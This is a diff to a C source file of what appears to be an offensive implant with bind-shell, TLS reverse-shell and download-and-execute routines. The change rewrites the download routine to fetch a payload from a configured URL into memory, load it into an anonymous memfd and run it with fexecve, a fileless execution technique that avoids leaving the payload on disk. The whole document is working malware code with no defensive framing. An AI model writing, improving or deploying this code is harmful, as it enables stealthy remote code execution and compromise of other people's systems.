@@ -1,17 +1,42 @@
+#ifdef DOWNLOAD_URL
+#define _GNU_SOURCE
+#include <sys/mman.h>
+#include <curl/curl.h>
+#endif
+
+#ifndef DOWNLOAD_URL
 #include <stdio.h>
 #include <sys/socket.h>
 #include <netinet/ip.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <openssl/ssl.h>
-#include <curl/curl.h>
 #include <sys/wait.h>
 #include <fcntl.h>
 #include <errno.h>
 #include <sys/stat.h>
+#endif
 
 #include "../include/attacks.h"
 #include "../include/utils.h"
+
+#ifdef DOWNLOAD_URL
+struct memory {
+    char *response;
+    size_t size;
+};
+
+static size_t call_back_func(char *data, size_t size, size_t nmemb, void *clientp) {
+    size_t realsize = size * nmemb;
+    struct memory *mem = (struct memory *) clientp;
+
+    char *ptr = realloc(mem->response, mem->size + realsize);
+    mem->response = ptr;
+    memcpy(mem->response + mem->size, data, realsize);
+    mem->size += realsize;
+    return realsize;
+}
+#endif
 
 #if defined(REVERSE_SHELL) && defined(REVERSE_IP) && defined(REVERSE_PORT) && defined(DELAY_TIME)
 static SSL_CTX *create_context(const SSL_METHOD *method) {
@@ -112,36 +137,6 @@ static void handle_shell(SSL *ssl) {
 }
 #endif
 
-static int execute(char *file_path) {
-#ifdef DOWNLOAD_URL
-    if(chmod(file_path, 0777) != 0) {
-        LOG("Unable to change file permissions of file in execute()\n");
-        return -1;
-    }
-
-    int i;
-    switch(i = fork()) {
-        case -1:
-            LOG("fork() failed in execute()\n");
-            return -1;
-        // child process
-        case 0:
-            LOG("Attempting to exec \"%s\" in execute()\n", file_path);
-            char *argv[] = {file_path, NULL};
-            execve(file_path, argv, NULL);
-            LOG("execve failed in execute(): %s\n", strerror(errno));
-            exit(EXIT_FAILURE);
-        default:
-            break;
-    }
-
-    int status;
-    waitpid(i, &status, 0);
-    
-    return 0;
-#endif
-}
-
 void bind_shell(void) {
 #if defined(BIND_SHELL) && defined(BIND_PORT)
     struct sockaddr_in addr;
@@ -215,16 +210,8 @@ void rev_shell(void) {
 void download_exec(void) {
 #ifdef DOWNLOAD_URL
     CURLcode res;
-    FILE *fp;
-    char *file_path = "/tmp/payload";
-
-    fp = fopen(file_path, "wb");
-    if(!fp) {
-        LOG("failed to open %s in download_exec()\n", file_path);
-        return;
-    }
-
-    curl_global_init(CURL_GLOBAL_DEFAULT); // fix this, we shouldnt be calling everytime
+    struct memory chunk = {0};
+    curl_global_init(CURL_GLOBAL_DEFAULT);
 
     CURL *curl = curl_easy_init();
     
@@ -234,25 +221,36 @@ void download_exec(void) {
     }
  
     curl_easy_setopt(curl, CURLOPT_URL, DOWNLOAD_URL);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)fp);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, call_back_func);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
 
     res = curl_easy_perform(curl);
     if(res) {
         LOG("curl_easy_perform() error: %s\n", curl_easy_strerror(res));
-        fclose(fp);
         curl_easy_cleanup(curl);
         curl_global_cleanup();
         return;
     }
 
-    fclose(fp); // close file before executing
-
-    if(execute(file_path) != 0) {
-        LOG("failed to perform execution in download_exec()\n");
+    int mfd = memfd_create("mfd", MFD_CLOEXEC);
+    if(mfd == -1) {
+        LOG("memfd_create() failed: %s\n", strerror(errno));
+        free(chunk.response);
+        curl_easy_cleanup(curl);
+        curl_global_cleanup();
+        return;
     }
 
-    
+    write(mfd, chunk.response, chunk.size);
+
+    free(chunk.response);
     curl_easy_cleanup(curl);
-    curl_global_cleanup(); // fix this, we shouldnt be calling every time
+    curl_global_cleanup();
+
+    char *argv[] = { "downloaded_binary", NULL };
+    char *envp[] = { NULL };
+    fexecve(mfd, argv, envp);
+    LOG("fexecve failed in execute(): %s\n", strerror(errno));
+    exit(EXIT_FAILURE);
 #endif
 }
